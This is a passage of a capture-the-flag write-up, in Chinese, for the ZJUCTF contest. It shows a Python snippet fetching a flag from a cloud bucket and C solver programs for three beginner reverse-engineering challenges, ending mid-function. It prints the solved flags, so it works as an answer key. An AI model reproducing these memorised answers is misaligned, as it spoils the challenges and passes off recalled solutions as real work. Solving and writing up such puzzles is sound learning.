<span class="n">bucket</span> <span class="o">=</span> <span class="n">oss2</span><span class="o">.</span><span class="n">Bucket</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">,</span> <span class="n">bucket_name</span><span class="p">)</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">bucket</span><span class="o">.</span><span class="n">get_object</span><span class="p">(</span><span class="s1">&#39;fffffflllllaaaagggg.txt&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div>
<h2 id="reverse">Reverse<a class="headerlink" href="#reverse" title="Permanent link">&para;</a></h2>
<h3 id="rev-beginner-1">rev beginner 1<a class="headerlink" href="#rev-beginner-1" title="Permanent link">&para;</a></h3>
<p>IDA 打开直接就能看到 flag 是如何验证的，直接写脚本解密即可。</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;iostream&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="mi">31</span><span class="p">];</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1180126042</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2038516568</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1953070957</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-2072744833</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2089054334</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1451916667</span><span class="p">;</span>
<span class="w">    </span><span class="n">flag</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-107</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">24</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{rev_is_fun_right?}</code>。</p>
<h3 id="rev-beginner-2">rev beginner 2<a class="headerlink" href="#rev-beginner-2" title="Permanent link">&para;</a></h3>
<p>给的可执行文件是 80386 的，用了 <code>das</code> 指令，每个字符是独立的，分别爆破就行。</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">das</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">al</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="o">*</span><span class="n">al</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">9</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">af</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">*</span><span class="n">al</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span>
<span class="w">        </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">al</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0x9F</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">cf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">*</span><span class="n">al</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mh">0x60</span><span class="p">;</span>
<span class="w">        </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">v6</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-8h] [ebp-90h]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">v7</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-4h] [ebp-8Ch]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">v8</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-88h]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-88h]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">s1</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+4h] [ebp-84h] BYREF</span>
<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">v11</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+1Ch] [ebp-6Ch]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">v12</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+1Eh] [ebp-6Ah]</span>
<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">v13</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+36h] [ebp-52h]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">v14</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+38h] [ebp-50h]</span>
<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">v15</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+50h] [ebp-38h]</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">s2</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+52h] [ebp-36h] BYREF</span>
<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">v17</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+6Ah] [ebp-1Eh]</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">v18</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+6Ch] [ebp-1Ch]</span>

<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">s1</span><span class="p">));</span>
<span class="w">    </span><span class="n">v11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">807607868</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2035092818</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-615563966</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3126271</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1328692767</span><span class="p">;</span>
<span class="w">    </span><span class="n">v12</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1532805550</span><span class="p">;</span>
<span class="w">    </span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-28895</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-778337675</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">916896758</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2142365868</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">431515568</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">121126838</span><span class="p">;</span>
<span class="w">    </span><span class="n">v14</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1384365358</span><span class="p">;</span>
<span class="w">    </span><span class="n">v15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-11</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-456284019</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-825299208</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1858015695</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1263581624</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">678129086</span><span class="p">;</span>
<span class="w">    </span><span class="n">s2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1275860159</span><span class="p">;</span>
<span class="w">    </span><span class="n">v17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-30731</span><span class="p">;</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">af0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">cf0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">25</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// save af and cf</span>
<span class="w">        </span><span class="n">af0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">af</span><span class="p">;</span>
<span class="w">        </span><span class="n">cf0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cf</span><span class="p">;</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">200</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// restore af and cf</span>
<span class="w">            </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">af0</span><span class="p">;</span>
<span class="w">            </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cf0</span><span class="p">;</span>
<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">al</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">bl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">v12</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">cl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">res</span><span class="p">;</span>
<span class="w">            </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">al</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="n">bl</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">);</span>
<span class="w">            </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">al</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">bl</span><span class="p">;</span>
<span class="w">            </span><span class="n">al</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">al</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">bl</span><span class="p">;</span>
<span class="w">            </span><span class="n">das</span><span class="p">(</span><span class="o">&amp;</span><span class="n">al</span><span class="p">);</span>
<span class="w">            </span><span class="n">af</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">al</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">cl</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0xF</span><span class="p">;</span>
<span class="w">            </span><span class="n">cf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">al</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">cl</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
<span class="w">            </span><span class="n">al</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">al</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cl</span><span class="p">;</span>
<span class="w">            </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">al</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">26</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>得到 <code>ZJUCTF{welc0me-2-reverse@�</code>，猜一下最后两个字符，得到 flag <code>ZJUCTF{welc0me-2-reverse!}</code>。</p>
<h3 id="rev-beginner-3">rev beginner 3<a class="headerlink" href="#rev-beginner-3" title="Permanent link">&para;</a></h3>
<p>发现加密过程都可逆，那直接倒着解密就行了。虽然用了随机数，但给了种子，所以可以直接还原。另外不同架构上生成的随机数序列还不一样，放 amd64 机子上才能跑出来。</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">func1_rev</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a1</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">a2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">16909060</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">a2</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">16909060</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">a2</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">uint32_t</span><span class="w"> </span><span class="nf">__ROL4__</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">count</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">nbits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">count</span><span class="w"> </span><span class="o">%=</span><span class="w"> </span><span class="n">nbits</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">high</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">nbits</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">count</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="c1">// signed value</span>
<span class="w">      </span><span class="n">high</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="p">(((</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">count</span><span class="p">));</span>
<span class="w">    </span><span class="n">value</span><span class="w"> </span><span class="o">&lt;&lt;=</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
<span class="w">    </span><span class="n">value</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">high</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">count</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">nbits</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">low</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="p">(</span><span class="n">nbits</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">count</span><span class="p">);</span>
<span class="w">    </span><span class="n">value</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
<span class="w">    </span><span class="n">value</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">low</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint32_t</span><span class="w"> </span><span class="nf">__ROR4__</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">count</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">__ROL4__</span><span class="p">(</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">count</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">func2_rev</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a1</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="n">i</span><span class="w"> </span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
